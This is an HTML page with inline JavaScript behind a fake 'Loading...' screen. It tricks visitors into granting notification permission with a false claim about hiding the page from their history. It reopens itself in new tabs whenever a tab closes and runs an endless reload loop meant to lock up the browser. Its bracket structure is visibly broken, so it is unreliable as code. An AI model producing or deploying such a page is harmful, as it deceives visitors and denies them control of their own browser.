<style>
  body{
    background:url("");
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
  }
</style>
<div id="dcslk" style="position:absolute;width:100%;left:0px;top:0px;color:black;text-align:center;"><h1><b></b></h1></div>
<div id="loadingbg" style="position:absolute;width:100%;height:100%;left:0px;top:0px;background-color:black;color:white;text-align:center;"></div>
<div id="loading" style="position:absolute;width:100%;left:0px;top:0px;background-color:black;color:white;text-align:center;"><h1><b>Loading...</b></h1></div>
<script>
  if (Notification.permission !== "granted") {
    alert("popup premission needed to hide this from your history");
    Notification.requestPermission().then((result) => {
      console.log(result); // 'granted', 'denied', or 'default'
      if (result=="granted"){
        window.open(window.location.href);
      }
    }

    const bc = new BroadcastChannel("close-channel");
window.addEventListener("beforeunload", (e) => {
    bc.postMessage("close");
});

bc.addEventListener("message", (event) => {
    window.open(location.href, "_blank", "");
})


    var loading=document.getElementById("loading");
    loading.style.top=window.innerHeight/2-loading.offsetHeight/2;
    var dcslk=document.getElementById("dcslk");
    dcslk.style.top=window.innerHeight/2-dcslk.offsetHeight/2;
    window.onload=function(){
      document.getElementById("loading").style.display="none";
      document.getElementById("loadingbg").style.display="none";
      setTimeout(() => {
        while (true){
          window.location.reload();
        }
      },100);
    };
  });
</script>
